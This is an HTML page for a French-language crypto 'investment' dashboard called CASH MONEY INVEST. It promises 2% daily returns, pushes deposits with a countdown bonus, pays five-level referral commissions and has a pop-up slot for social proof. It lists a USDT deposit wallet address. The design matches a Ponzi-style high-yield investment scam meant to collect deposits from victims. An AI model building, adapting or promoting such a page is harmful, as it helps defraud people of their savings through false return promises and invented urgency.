<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CASH MONEY INVESTMENT</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>

    <nav class="sidebar">
        <div class="logo-area">
            <img class="logo-img" src="https://i.ibb.co/NXfkDYn/image.png" alt="CASH MONEY LOGO">
            <h2>CASH MONEY <span>INVEST</span></h2>
        </div>
        <ul>
            <li class="active"><a href="#"><i class="fas fa-home"></i> Dashboard</a></li>
            <li><a href="#"><i class="fas fa-wallet"></i> Recharger</a></li>
            <li><a href="#"><i class="fas fa-hand-holding-usd"></i> Retraits</a></li>
            <li><a href="#"><i class="fas fa-users"></i> Mon Équipe</a></li>
            <li><a href="#"><i class="fas fa-history"></i> Historique</a></li>
            <li class="logout-link"><a href="#"><i class="fas fa-sign-out-alt"></i> Quitter</a></li>
        </ul>
    </nav>

    <main class="main-content">
        
        <header class="top-header">
            <div class="welcome-text">
                <h1>Tableau de Bord</h1>
                <p>Gérez vos actifs en toute sécurité.</p>
            </div>
            <div class="user-profile-controls">
                <div class="notification-icon"><i class="fas fa-bell"></i></div>
                <div class="avatar-circle"><i class="fas fa-user"></i></div>
            </div>
        </header>

        <section class="promo-section">
            <div class="promo-card">
                <div class="promo-text">
                    <h3><i class="fas fa-bolt"></i> Bonus de Bienvenue +5%</h3>
                    <p>Offre limitée sur votre prochain dépôt. Expire dans :</p>
                </div>
                <div class="countdown-container">
                    <div class="time-box"><span id="hours">23</span><label>Hr</label></div>
                    <div class="time-box"><span id="minutes">59</span><label>Min</label></div>
                    <div class="time-box highlight"><span id="seconds">00</span><label>Sec</label></div>
                </div>
            </div>
        </section>

        <section class="stats-container">
            <div class="stat-card">
                <div class="icon-circle blue"><i class="fas fa-wallet"></i></div>
                <div class="stat-info"><h3>Solde Total</h3><p>0 FCFA</p></div>
            </div>
            <div class="stat-card">
                <div class="icon-circle green"><i class="fas fa-chart-line"></i></div>
                <div class="stat-info"><h3>Profits Net</h3><p>+ 0 FCFA</p></div>
            </div>
            <div class="stat-card">
                <div class="icon-circle orange"><i class="fas fa-users"></i></div>
                <div class="stat-info"><h3>Commissions</h3><p>0 FCFA</p></div>
            </div>
        </section>

        <div class="grid-two-cols">
            <div class="section-card">
                <h3><i class="fas fa-calculator"></i> Simulateur de Gains</h3>
                <label>Montant à investir (FCFA)</label>
                <input type="number" id="investAmount" placeholder="Ex: 50000" oninput="calculateGains()">
                <div class="sim-results">
                    <div class="res-item">Gain/Jour (2%): <strong id="dailyGain">0 FCFA</strong></div>
                    <div class="res-item total">Total (30j): <strong id="totalReturn">0 FCFA</strong></div>
                </div>
            </div>

            <div class="section-card">
                <h3><i class="fas fa-university"></i> Recharge USDT</h3>
                <label>Choisir le réseau :</label>
                <select id="network" onchange="updateAddress()">
                    <option value="bep20">Binance Smart Chain (BEP20)</option>
                    <option value="trc20">Tron Network (TRC20)</option>
                    <option value="erc20">Ethereum (ERC20)</option>
                </select>
                <div class="address-display">
                    <input type="text" id="walletAddress" value="0xfd3a795b11951cb62c28af99c09ad0d05bb80289" readonly>
                    <button onclick="copyAddress()" class="btn-copy">Copier</button>
                </div>
            </div>
        </div>

        <section class="section-card">
            <h3><i class="fas fa-sitemap"></i> Mon Réseau d'Affiliation</h3>
            <div class="levels-grid">
                <div class="lvl-card main"><span>Niveau 1</span><strong>10%</strong></div>
                <div class="lvl-card"><span>Niveau 2</span><strong>3%</strong></div>
                <div class="lvl-card"><span>Niveau 3</span><strong>1%</strong></div>
                <div class="lvl-card"><span>Niveau 4</span><strong>1%</strong></div>
                <div class="lvl-card"><span>Niveau 5</span><strong>1%</strong></div>
            </div>
            <div class="share-box">
                <input type="text" id="refLink" value="https://cashmoney.inv/?ref=CM-789" readonly>
                <button onclick="copyRefLink()" class="btn-copy">Copier mon lien</button>
            </div>
        </section>

        <section class="section-card">
            <div class="history-header">
                <h3>Historique des Retraits</h3>
                <div class="filters">
                    <button class="f-btn active" onclick="filterHistory('all')">Tous</button>
                    <button class="f-btn" onclick="filterHistory('completed')">Validés</button>
                </div>
            </div>
            <table>
                <thead><tr><th>Date</th><th>Montant</th><th>Statut</th></tr></thead>
                <tbody>
                    <tr class="history-row completed"><td>22/03/26</td><td>25,000 FCFA</td><td><span class="pill ok">Validé</span></td></tr>
                    <tr class="history-row pending"><td>21/03/26</td><td>10,000 FCFA</td><td><span class="pill wait">En attente</span></td></tr>
                </tbody>
            </table>
        </section>

    </main>

    <div id="social-proof" class="social-popup">
        <div class="p-icon"><i class="fas fa-check-circle"></i></div>
        <div class="p-content"><p id="p-text"></p><small id="p-time"></small></div>
    </div>

</body>
</html>
